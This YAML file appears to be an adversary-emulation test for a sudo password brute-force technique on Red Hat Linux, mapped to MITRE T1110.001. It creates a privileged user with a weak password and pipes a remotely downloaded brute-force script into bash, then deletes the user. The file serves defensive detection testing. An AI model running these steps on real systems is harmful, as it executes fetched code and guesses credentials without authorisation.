api_version: "2.0"
name: SUDO Brute Force - Redhat
description: "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n"
args:
    - name: remote_url
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
uuid: 4097bc00-5eeb-4d56-aaf9-287d60351d95
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.001: Password Guessing'
requirements:
    platforms:
        - os: linux
steps:
    - name: |
        Check if running on a Redhat based machine.
      inline: |
        if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "RedHat"; else echo "NOT RedHat"; {yum update && yum install -y openssl sudo curl
        }; fi
        if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
        if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
        if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
        if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
      executor: bash
    - name: sudo-brute-force---redhat
      inline: |
        useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
        su art
        cd /tmp
        curl -s {{.Args.remote_url}} |bash
      executor: bash
      cleanup:
        inline: |
            userdel -fr art
        executor: bash
